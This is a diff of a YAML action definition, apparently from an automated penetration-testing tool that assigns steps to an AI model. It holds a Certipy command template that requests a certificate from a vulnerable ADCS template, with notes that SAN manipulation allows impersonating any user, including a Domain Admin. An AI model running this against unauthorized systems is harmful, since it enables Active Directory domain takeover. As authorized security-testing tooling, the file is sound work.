@@ -2,16 +2,20 @@ name: certipy_req
 category: ad
 description: Request certificate from vulnerable ADCS template
 preconditions:
-  - domain_joined
-  - has_cred
+- domain_joined
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "certipy req -u '{username}@{domain}' -p '{password}' -ca '{ca_name}' -template '{template}' -dc-ip {target_ip}"
+command_template: certipy req -u '{username}@{domain}' -p '{password}' -ca '{ca_name}'
+  -template '{template}' -dc-ip {target_ip}
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Requests certificate using vulnerable template (ESC1/ESC2/ESC3). With SAN manipulation, can request cert as any user including DA. Resulting PFX used for PKINIT auth."
+mechanism: Requests certificate using vulnerable template (ESC1/ESC2/ESC3). With SAN
+  manipulation, can request cert as any user including DA. Resulting PFX used for
+  PKINIT auth.
+hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates.md
